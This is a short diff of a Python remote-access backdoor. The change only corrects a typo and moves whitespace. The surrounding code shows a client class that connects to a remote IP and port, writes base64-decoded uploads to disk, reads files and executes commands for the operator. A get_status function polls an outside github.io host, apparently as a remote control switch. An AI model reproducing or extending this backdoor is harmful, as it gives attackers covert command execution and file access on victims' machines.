@@ -43,7 +43,7 @@ class MotherFucker():
         with open(path, "wb") as file:
             decoded_file = base64.b64decode(content)
             file.write(decoded_file)
-            return "Uploaded Succesfully !"
+            return "Uploaded Successfully !"
 
     def read_file(self, path):
         with open(path, "rb") as file:
@@ -71,15 +71,14 @@ class MotherFucker():
             except Exception:
                 cmd_rslt = "[-] Error During Command Execution."
             self.json_send (cmd_rslt)
+
+
 def get_status():
     s = requests.get('https://poggerpussy.github.io').text
     #status = re.sub(r"<.*?>",'', s)
     if s == "true":
         return True
     return False
-
-
-
 
 try:
     jja213415 = MotherFucker(IP, PORT)
